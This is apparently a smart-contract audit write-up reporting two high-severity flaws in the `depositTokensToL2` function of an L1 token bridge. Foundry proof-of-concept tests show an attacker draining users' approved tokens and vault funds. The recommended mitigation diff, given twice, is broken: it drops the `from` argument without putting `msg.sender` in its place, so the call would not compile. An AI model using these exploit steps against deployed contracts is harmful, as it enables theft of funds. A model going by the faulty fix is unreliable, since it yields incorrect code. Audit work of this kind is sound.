[H-1] TITLE (Root Cause -> Impact) Anyone can move tokens to L2 if they are approved by calling `L1BossBridge::depositTokensToL2` function.

Description: In the function `L1BossBridge::depositTokensToL2` anyone can move tokens to L2 if the user has approved.
1. User approves to mve tokens to `L1BossBridge` with some amount.
2. Attacker calls the function `depositTokensToL2` with parameters from the user who approved and in to the attacker puts his address.
3. The added amount gets transfered to the attackers vault.

Impact: The Users tokens can get stolen very easily.

Proof of Concept: Consider adding the below test in your `L1BossBridgeTest.t.sol`.

<details>
<summary>Proof of Code</summary>

```javascript
function testAnyoneCanMoveApprovedTokens() public {
        vm.prank(user);
        token.approve(address(tokenBridge),type(uint256).max);
        uint256 userStartBalance = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        tokenBridge.depositTokensToL2(user, attacker, token.balanceOf(user));
        uint256 userEndBalance = token.balanceOf(user);
        vm.stopPrank();
        console2.log("userEndBalance",userEndBalance);
        assertEq(userEndBalance,0);
        assert(token.balanceOf(address(vault)) == userStartBalance);
    }
```
</details>

Recommended Mitigation: I highly recommend you to remove the parameter `address from` from the function `depositTokensToL2`. Conider adding the below changes in the function `depositTokensToL2`.

```diff
function depositTokensToL2(
-        address from,
        address l2Recipient,
        uint256 amount
    ) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-        token.safeTransferFrom(from, address(vault), amount);
+        token.safeTransferFrom(address(vault), amount);
-        emit Deposit(from, l2Recipient, amount);
+        emit Deposit(l2Recipient, amount);
    }
```






[H-2] TITLE (Root Cause -> Impact) Anyone can transfer funds from the vault just by calling `L1BossBridge::depositTokensToL2` function.

Description: Due to this from paramteter in the function `depositTokensToL2` an attacker can even transfer funcds present in the contract to the vault and due to this the attacker can mint many tokens to his address and can even steal funds from the vault.

Impact: Attacker can mint all the tokens to themselves.

Proof of Concept: Consider adding the below test in your `L1BossBridgeTest.t.sol`.

<details>
<summary>Proof of Code</summary>

```javascript
function testAnyoneCanTranferFromVault() public {
        address attacker = makeAddr("attacker");
        uint256 amount = 500 ether;
        deal(address(token),address(vault),amount);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, amount);
        tokenBridge.depositTokensToL2(address(vault), attacker, amount);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, amount);
        tokenBridge.depositTokensToL2(address(vault), attacker, amount);
    }
```

</details>

Recommended Mitigation: I highly recommend you to remove the parameter `address from` from the function `depositTokensToL2`. Conider adding the below changes in the function `depositTokensToL2`.

```diff
function depositTokensToL2(
-        address from,
        address l2Recipient,
        uint256 amount
    ) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-        token.safeTransferFrom(from, address(vault), amount);
+        token.safeTransferFrom(address(vault), amount);
-        emit Deposit(from, l2Recipient, amount);
+        emit Deposit(l2Recipient, amount);
    }
```